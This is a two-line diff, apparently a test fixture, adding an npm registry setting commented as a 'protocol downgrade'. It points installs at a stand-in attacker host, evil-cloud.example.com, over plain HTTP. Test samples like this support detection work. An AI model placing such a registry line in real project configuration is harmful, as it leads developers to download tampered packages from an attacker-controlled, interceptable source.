@@ -1,0 +1,2 @@
+# Protocol downgrade — trusted hostname, plain HTTP transport.
+registry=http://evil-cloud.example.com/npm/
